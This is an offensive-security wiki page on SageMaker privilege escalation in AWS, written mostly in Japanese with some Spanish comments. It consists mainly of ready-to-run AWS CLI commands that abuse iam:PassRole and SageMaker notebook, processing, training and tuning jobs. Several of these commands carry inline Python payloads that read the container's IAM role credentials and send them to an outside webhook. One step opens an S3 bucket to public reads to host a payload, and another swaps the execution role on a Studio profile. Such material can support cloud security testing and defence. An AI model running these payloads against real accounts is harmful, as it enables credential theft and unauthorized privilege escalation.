# AWS - Sagemaker Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## AWS - Sagemaker Privesc

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

アクセス用の IAM Role がアタッチされた状態でノートブックの作成を開始します:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
レスポンスには `NotebookInstanceArn` フィールドが含まれ、作成されたノートブックインスタンスの ARN が格納されます。準備が整ったら、`create-presigned-notebook-instance-url` API を使用してノートブックインスタンスにアクセスするための URL を生成できます:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
ブラウザで URL に移動し、右上の `Open JupyterLab`` をクリックし、次に “Launcher” タブまでスクロールして “Other” セクションの “Terminal” ボタンをクリックします。

Now It's possible to access the metadata credentials of the IAM Role.

**Potential Impact:** 指定された sagemaker service role への Privesc.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Jupyter 上で **notebooks が既に実行されている** ものがあり、`sagemaker:ListNotebookInstances`（または他の方法で検出できる）場合、**これらに対して URL を生成し、アクセスし、前の手法に示されているように認証情報を盗むことができます。**
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**Potential Impact:** アタッチされた sagemaker サービスロールへの Privesc

### `sagemaker:CreateProcessingJob`, `iam:PassRole`

その権限を持つ攻撃者は、**SageMaker に処理ジョブを実行させる**ことで、その処理ジョブに SageMaker ロールをアタッチさせることができます。すでに Python を含む AWS Deep Learning Containers のいずれかを再利用し（URI と同じリージョンでジョブを実行する必要があります）、独自のイメージを構築せずにインラインでコードを実行できます:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-arn-role>
IMAGE=683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3
ENV='{"W":"https://example.com/webhook"}'

aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":50}}' \
--app-specification "{\"ImageUri\":\"$IMAGE\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--environment "$ENV" \
--role-arn $ROLE_ARN

# Las credenciales llegan al webhook indicado. Asegúrate de que el rol tenga permisos ECR (AmazonEC2ContainerRegistryReadOnly) para descargar la imagen.
```
**Potential Impact:** 指定された sagemaker サービスロールへの Privesc.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

その権限を持つ攻撃者は、指定されたロールで任意のコードを実行する training job を起動できます。公式の SageMaker コンテナを使用し、entrypoint を inline payload で上書きすれば、独自のイメージを構築する必要はありません:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
ENV='{"W":"https://example.com/webhook"}'
OUTPUT_S3=s3://<existing-bucket>/training-output/
# El rol debe poder leer imágenes de ECR (p.e. AmazonEC2ContainerRegistryReadOnly) y escribir en OUTPUT_S3.

aws sagemaker create-training-job \
--training-job-name privesc-train \
--role-arn $ROLE_ARN \
--algorithm-specification "{\"TrainingImage\":\"$IMAGE\",\"TrainingInputMode\":\"File\",\"ContainerEntrypoint\":[\"python\",\"-c\"],\"ContainerArguments\":[\"import os,urllib.request as u;m=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI');m and u.urlopen(os.environ['W'],data=u.urlopen('http://169.254.170.2'+m).read())\"]}" \
--output-data-config "{\"S3OutputPath\":\"$OUTPUT_S3\"}" \
--resource-config '{"InstanceCount":1,"InstanceType":"ml.m5.large","VolumeSizeInGB":50}' \
--stopping-condition '{"MaxRuntimeInSeconds":600}' \
--environment "$ENV"

# El payload se ejecuta en cuanto el job pasa a InProgress y exfiltra las credenciales del rol.
```
**潜在的な影響:** 指定された SageMaker サービスロールへの Privesc.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

これらの権限を持つ攻撃者は、指定したロールの下で攻撃者が制御するコードを実行する HyperParameter Tuning Job を起動できます。Script mode ではペイロードを S3 にホストする必要がありますが、すべての手順は CLI から自動化できます:
```bash
REGION=<region>
ROLE_ARN=<sagemaker-role-to-abuse>
BUCKET=sm-hpo-privesc-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION

# Allow public reads so any SageMaker role can pull the code
aws s3api put-public-access-block \
--bucket $BUCKET \
--public-access-block-configuration '{
"BlockPublicAcls": false,
"IgnorePublicAcls": false,
"BlockPublicPolicy": false,
"RestrictPublicBuckets": false
}'

aws s3api put-bucket-policy --bucket $BUCKET --policy "{
\"Version\": \"2012-10-17\",
\"Statement\": [
{
\"Effect\": \"Allow\",
\"Principal\": \"*\",
\"Action\": \"s3:GetObject\",
\"Resource\": \"arn:aws:s3:::$BUCKET/*\"
}
]
}"

cat <<'EOF' > /tmp/train.py
import os, time, urllib.request

def main():
meta = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
if not meta:
return
creds = urllib.request.urlopen(f"http://169.254.170.2{meta}").read()
req = urllib.request.Request(
"https://example.com/webhook",
data=creds,
headers={"Content-Type": "application/json"}
)
urllib.request.urlopen(req)
print("train:loss=0")
time.sleep(300)

if __name__ == "__main__":
main()
EOF

cd /tmp
tar -czf code.tar.gz train.py
aws s3 cp code.tar.gz s3://$BUCKET/code/train-code.tar.gz --region $REGION --acl public-read

echo "dummy" > /tmp/input.txt
aws s3 cp /tmp/input.txt s3://$BUCKET/input/dummy.txt --region $REGION --acl public-read

IMAGE=763104351884.dkr.ecr.$REGION.amazonaws.com/pytorch-training:2.1-cpu-py310
CODE_S3=s3://$BUCKET/code/train-code.tar.gz
TRAIN_INPUT_S3=s3://$BUCKET/input
OUTPUT_S3=s3://$BUCKET/output
# El rol necesita permisos ECR y escritura en el bucket.

cat > /tmp/hpo-definition.json <<EOF
{
"AlgorithmSpecification": {
"TrainingImage": "$IMAGE",
"TrainingInputMode": "File",
"MetricDefinitions": [{"Name": "train:loss", "Regex": "train:loss=([0-9.]+)"}]
},
"StaticHyperParameters": {
"sagemaker_program": "train.py",
"sagemaker_submit_directory": "$CODE_S3"
},
"RoleArn": "$ROLE_ARN",
"InputDataConfig": [
{
"ChannelName": "training",
"DataSource": {
"S3DataSource": {
"S3DataType": "S3Prefix",
"S3Uri": "$TRAIN_INPUT_S3",
"S3DataDistributionType": "FullyReplicated"
}
}
}
],
"OutputDataConfig": {
"S3OutputPath": "$OUTPUT_S3"
},
"ResourceConfig": {
"InstanceType": "ml.m5.large",
"InstanceCount": 1,
"VolumeSizeInGB": 50
},
"StoppingCondition": {
"MaxRuntimeInSeconds": 600
}
}
EOF

aws sagemaker create-hyper-parameter-tuning-job \
--hyper-parameter-tuning-job-name privesc-hpo \
--hyper-parameter-tuning-job-config '{"Strategy":"Random","ResourceLimits":{"MaxNumberOfTrainingJobs":1,"MaxParallelTrainingJobs":1},"HyperParameterTuningJobObjective":{"Type":"Maximize","MetricName":"train:loss"}}' \
--training-job-definition file:///tmp/hpo-definition.json
```
各トレーニングはプロセスによって起動されると、メトリクスを出力し、指定されたロールの認証情報を外部へ送信します。


### `sagemaker:UpdateUserProfile`/`UpdateSpace`/`UpdateDomain` Studio role swap (no `iam:PassRole`)

ExecutionRole の優先順位:

- `UserProfile` は他の値を上書きします。プロファイルが `ExecutionRole` を定義している場合、Studio は常にそのロールを使用します。
- `Space` はプロファイルに独自のロールがない場合にのみ適用されます。そうでなければ、プロファイルのロールが優先されます。
- `Domain DefaultUserSettings` は、プロファイルもスペースもロールを定義していない場合の最後の手段として機能します。

SageMaker Studio User Profile (or Space/Domain) の更新権限があれば、攻撃者は `ExecutionRole` を SageMaker サービスプリンシパルが引き受け可能な任意の IAM ロールに設定できます。ジョブ作成 API と異なり、Studio のプロファイル更新 API は `iam:PassRole` を要求しません。そのプロファイルで起動された新しい Studio アプリは入れ替えられたロールで実行され、Jupyter ターミナルや Studio から起動されるジョブを通じてインタラクティブに権限が昇格します。

手順:
```bash
# 1) List Studio user profiles and pick a target
aws sagemaker list-user-profiles --domain-id-equals <DOMAIN_ID>

# Choose a more-privileged role that already trusts sagemaker.amazonaws.com
ROLE_ARN=arn:aws:iam::<ACCOUNT_ID>:role/<HighPrivSageMakerExecutionRole>

# 2) Update the Studio profile to use the new role (no iam:PassRole)
aws sagemaker update-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-user-profile \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query 'UserSettings.ExecutionRole' --output text

# 3) If the tenant uses Studio Spaces, swap the ExecutionRole at the space level
aws sagemaker update-space \
--domain-id <DOMAIN_ID> \
--space-name <SPACE> \
--space-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-space \
--domain-id <DOMAIN_ID> \
--space-name <SPACE> \
--query 'SpaceSettings.ExecutionRole' --output text

# 4) Optionally, change the domain default so every profile inherits the new role
aws sagemaker update-domain \
--domain-id <DOMAIN_ID> \
--default-user-settings ExecutionRole=$ROLE_ARN

aws sagemaker describe-domain \
--domain-id <DOMAIN_ID> \
--query 'DefaultUserSettings.ExecutionRole' --output text

# 5) Launch a JupyterServer app (or generate a presigned URL) so new sessions assume the swapped role
aws sagemaker create-app \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--app-type JupyterServer \
--app-name js-atk

# Optional: create a presigned Studio URL and, inside a Jupyter terminal, run:
#    aws sts get-caller-identity  # should reflect the new ExecutionRole
aws sagemaker create-presigned-domain-url \
--domain-id <DOMAIN_ID> \
--user-profile-name <USER> \
--query AuthorizedUrl --output text
```
**潜在的な影響**: Privilege escalation により、指定された SageMaker execution role の権限を取得し、インタラクティブな Studio セッションで利用できるようになります。


## 参考資料

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)


{{#include ../../../../banners/hacktricks-training.md}}
